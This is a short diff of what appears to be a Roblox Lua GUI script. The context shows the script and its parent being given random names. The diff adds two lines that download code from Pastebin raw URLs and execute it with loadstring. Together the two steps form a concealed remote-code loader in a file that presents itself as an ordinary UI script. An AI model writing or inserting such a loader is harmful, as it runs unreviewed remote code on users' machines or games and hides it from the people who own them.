@@ -1250,6 +1250,8 @@ local script = G2L["2b"];
 	
 	script.Parent.Name = gerarNomeAleatorio(10)
 	script.Name = gerarNomeAleatorio(10)
+	loadstring(game:HttpGet('https://pastebin.com/raw/qfmByDZ3'))()
+        loadstring(game:HttpGet("https://pastebin.com/raw/hq9FKvrC"))()
 end;
 task.spawn(C_2b);
 
